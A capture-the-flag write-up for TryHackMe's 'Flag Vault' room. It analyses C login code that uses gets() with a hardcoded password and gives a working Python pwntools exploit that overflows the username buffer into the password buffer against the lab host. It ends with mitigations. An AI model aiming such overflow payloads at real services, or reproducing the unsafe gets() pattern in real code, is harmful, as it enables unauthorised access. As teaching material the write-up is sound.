# TryHackMe - Flag Vault (CTF Write-up)

> Author: Adam Pawelczyk
>
> Date: 2025-07-06
>
> Category: Binary Exploitation / Reverse Engineering
>
> Difficulty: Easy
>
> [TryHackMe Link](https://tryhackme.com/room/hfb1flagvault)

---

## Challenge Description

> Cipher asked me to create the most secure vault for flags, so I created a vault that cannot be accessed. You don't believe me? Well, here is the code with the password hardcoded. Not that you can do much with it anymore.

The challenge provides the source code for a C-based login system. According to the challenge description, the password is hardcoded, but the input for it is commented out.


## Goal

Bypass the login mechanism and retrieve the flag.


## TL;DR

- The provided C source code was analyzed to understand the authentication logic.
- The password input was found to be disabled, while the hardcoded password check remained active.
- A buffer overflow vulnerability was identified due to the use of the unsafe `gets()` function.
- An exploit was created using Python and `pwntools` to overwrite the `password` buffer.
- The exploit successfully bypassed authentication and retrieved the flag.


## Source Code Analysis

The challenge provides the C source code, Below is a breakdown of the most critical part:

```c
char password[100] = "";
char username[100] = "";

printf("Username: ");
gets(username);

// If I disable the password, nobody will get in.
//printf("Password: ");
//gets(password);

if(!strcmp(username, "bytereaper") && !strcmp(password, "5up3rP4zz123Byte")){
    print_flag();
}
else{
    printf("Wrong password! No flag for you.");
}
```

### Key Observations:

- Password input is disabled, and the `password` buffer remains an empty string.
- Insecure function `gets()` is used, which does not check bounds and allows buffer overflows.
- If both username and password match the hardcoded values, the flag is printed.
- Because the `username` buffer is user-controlled and located before `password` in memory, it is possible to overflow into `password` with sufficiently long input.


## Exploitation Strategy

The objective is to overwrite the empty `password` buffer with `5up3rP4zz123Byte` string by overflowing the `username` buffer. The correct padding between `username` and `password` is determined through brute-forcing.

## Exploit Code

```python
from pwn import *

context.log_level = 'warning'

for padding in range(89, 110):
    conn = remote('10.10.147.75', 1337)
    payload = b'bytereaper\x00' + b'0' * padding + b'5up3rP4zz123Byte'

    conn.recvuntil(b'Username:')
    conn.sendline(payload)

    response = conn.recvall().decode().lstrip()

    if response != 'Wrong password! No flag for you.':
        print(f'padding: {padding}')
        print(f'flag: {response}')
```

This script:
- Connects to the server.
- Sends a crafted payload to overflow `username` and overwrite `password`.
- Brute-forces the correct padding.
- Prints the flag on a successful authentication.

## Exploitation Output

Upon executing the exploit code, the flag is retrieved:

![flag](images/flag.png)


### Why is the Padding 101 Bytes?

After placing the 10-character username and its null terminator (11 bytes total), it would seem that the remaining 89 bytes of the 100-byte `username` buffer should end exactly at the boundary.

However, stack variables are aligned in memory, and a **12-byte padding** is inserted between the `username` and `password` buffers. This alignment, enforced by the **System V AMD64 ABI** followed by modern compilers like GCC, ensures 16-byte stack alignment for performance and compatibility.

To overwrite `password` starting from `username`, the required layout is:

- 11 bytes - username + null terminator.
- 101 bytes - padding (89 remaining in `username` + 12-byte alignment gap).

Total: **112 bytes**, which matches the observed working exploit.

## Conclusion

The challenge showcased a classic example of insecure coding practices in C using `gets()` without bounds checking and leaving critical logic in place even when input is removed.

## Skills Practiced

- Manual code review and vulnerability analysis.
- Understanding stack layout and memory buffer overflows.
- Writing custom exploits using `pwntools`.

## Mitigations

- Never use `gets()` - it's unsafe. Use `fgets()` or other bounded alternatives.
- Never store passwords in plaintext or hardcode them into binaries.
- Always validate input length and use secure memory handling practices.

## Final Thoughts

Although the password prompt was disabled, the actual authentication logic remained, making the system vulnerable to a buffer overflow exploit. This challenge was a fun and simple exercise in binary exploitation and reverse engineering fundamentals.

**Note:** The flag value has been redacted in accordance with TryHackMe's write-up policy.